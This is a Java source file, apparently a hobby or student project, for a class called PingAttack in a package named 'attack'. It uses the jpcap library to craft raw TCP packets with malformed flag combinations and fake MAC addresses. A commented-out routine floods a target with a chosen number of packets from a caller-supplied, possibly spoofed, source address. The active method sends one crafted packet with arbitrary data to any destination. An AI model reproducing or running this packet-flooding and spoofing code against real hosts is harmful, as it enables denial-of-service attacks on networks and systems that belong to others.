/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package attack;

import java.net.InetAddress;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

/**
 *
 * 
 */
public class PingAttack implements PacketReceiver {

    private static JpcapSender sender;

//    public static void main(String args[]) {
//        try {
//            NetworkInterface devices[] = JpcapCaptor.getDeviceList();
//            System.out.println(devices.length);
//            // device[1] = WiFi - NiRRaNjAN-PC
//            // device[2] = LAN  - NiRRaNjAN-PC
//            JpcapCaptor pcap = JpcapCaptor.openDevice(devices[2], 65535, false, 20);
//            PingAttack attacker = new PingAttack();
//            pcap.loopPacket(10, attacker);
//            sender = pcap.getJpcapSenderInstance();
//        } catch (Exception ex) {
//            ex.printStackTrace(System.err);
//        }
//    }
    static {
        try {
            NetworkInterface devices[] = JpcapCaptor.getDeviceList();
            System.out.println("Device length is :: " + devices.length);
            JpcapCaptor pcap = JpcapCaptor.openDevice(devices[1], 65535, false, 20);
            sender = pcap.getJpcapSenderInstance();
        } catch (Exception ex) {
            ex.printStackTrace(System.err);
        }
    }

    private static int total;

//    public static void sendPing(final String source, final String dest, final String num) {
//        try {
//            total = Integer.parseInt(num.trim());
//        } catch (Exception ex) {
//            ex.printStackTrace(System.err);
//            total = 100;
//        }
//        new Thread() {
//
//            @Override
//            public void run() {
//                try {
//                    TCPPacket tcp = new TCPPacket(12, 34, 56, 78, false, false, false, false,
//                            true, true, true, true, 10, 10);
//                    tcp.setIPv4Parameter(0, false, false, false, 0, false, false, false, 0, 1010101, 100, IPPacket.IPPROTO_IP, InetAddress.getByName(source), InetAddress.getByName(dest));
//                    EthernetPacket ether = new EthernetPacket();
//                    ether.frametype = EthernetPacket.ETHERTYPE_IP;
//                    ether.src_mac = new byte[]{(byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5};
//                    ether.dst_mac = new byte[]{(byte) 0, (byte) 6, (byte) 7, (byte) 8, (byte) 9, (byte) 10};
//                    //set the datalink frame of the packet p as ether
//                    tcp.datalink = ether;
//                    tcp.data = "Sample Data.".getBytes();
//                    long start = System.nanoTime();
//                    for (int i = 0; i < total; i++) {
//                        sender.sendPacket(tcp);
//                    }
//                    long end = System.nanoTime();
//                    double seconds = (end-start)/1000000000d;
//                    System.out.println("Total :: " + seconds + " seconds.");
//                } catch (Exception ex) {
//                    ex.printStackTrace(System.err);
//                }
//            }
//
//        }.start();
//    }

    public static void sendAttack(String dest, String data) {
        try {
            TCPPacket tcp = new TCPPacket(12, 34, 56, 78, false, false, false, false,
                    true, true, true, true, 10, 10);
            tcp.setIPv4Parameter(0, false, false, false, 0, false, false, false, 0, 1010101, 100, IPPacket.IPPROTO_IP,
                    InetAddress.getLocalHost(), InetAddress.getByName(dest));
            EthernetPacket ether = new EthernetPacket();
            ether.frametype = EthernetPacket.ETHERTYPE_IP;
            ether.src_mac = new byte[]{(byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5};
            ether.dst_mac = new byte[]{(byte) 0, (byte) 6, (byte) 7, (byte) 8, (byte) 9, (byte) 10};
            //set the datalink frame of the packet p as ether
            tcp.data = data.getBytes();
            tcp.datalink = ether;
            sender.sendPacket(tcp);
        } catch (Exception ex) {
            ex.printStackTrace(System.err);
        }
    }

    @Override
    public void receivePacket(Packet packet) {
        System.out.println("Received...");
    }

}
